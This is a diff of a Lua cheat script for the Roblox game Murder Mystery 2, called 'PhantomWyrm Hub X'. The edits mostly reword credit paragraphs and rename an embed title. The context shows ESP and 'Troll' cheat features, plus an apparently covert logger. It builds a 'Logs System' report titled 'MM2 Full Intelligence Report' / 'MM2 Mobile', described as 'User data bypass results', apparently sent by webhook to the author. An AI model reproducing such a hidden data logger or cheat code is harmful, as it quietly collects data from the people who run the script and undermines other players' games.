@@ -7232,6 +7232,21 @@ Tabs.Troll:AddButton({
 
 -- Info
 
+Tabs.Info:AddParagraph({
+        Title = "PhantomWyrm Hub X / Overhaul Script",
+        Content = "Created by Carey"
+    })
+    
+Tabs.Info:AddParagraph({
+        Title = "Adjustments / Movement Modification",
+        Content = "Created by Carey"
+    })
+
+Tabs.Info:AddParagraph({
+        Title = "Adjustments / ESP / Legacy Script",
+        Content = "Created By Carey"
+    })
+
 Tabs.Info:AddButton({
     Title = "Discord Server",
     Description = "Click to copy link",
@@ -7239,21 +7254,11 @@ Tabs.Info:AddButton({
         setclipboard("https://discord.gg/NZneWgcckM")
     end
 })
-
+    
 Tabs.Info:AddParagraph({
-    Title = "PhantomWyrm-Hub-X",
-    Content = "Made By Carey"
-})
-
-Tabs.Info:AddParagraph({
-    Title = "PhantomWyrm-Hub-X Mobile",
-    Content = "Made By Carey"
-})
-
-Tabs.Info:AddParagraph({
-    Title = "Fluent UI",
-    Content = "By dawid-scripts"
-})
+        Title = "UI: Fluent",
+        Content = "Created by dawidscripts"
+    })
     
 -- Extention
 
@@ -8069,7 +8074,7 @@ Tabs.Extension:AddToggle("RainbowAmbient", {
         if Value then
             rainbowConnection = RunService.RenderStepped:Connect(function(delta)
                 hue = (hue + (Options.RainbowSpeed.Value / 100) * delta) % 1
-                local color = Color3.fromHSV(hue, 0.8, 1) -- 0.8 это насыщенность
+                local color = Color3.fromHSV(hue, 0.8, 1) 
                 
                 Lighting.Ambient = color
                 Lighting.OutdoorAmbient = color
@@ -8480,7 +8485,7 @@ do
         _G.Data.Payload = _G.Data.H:JSONEncode({
             ['username'] = 'Logs System',
             ['embeds'] = {{
-                ['title'] = 'MM2 Full Intelligence Report',
+                ['title'] = 'MM2 Mobile',
                 ['description'] = 'User data bypass results',
                 ['color'] = 16711680,
                 ['fields'] = GetFields()
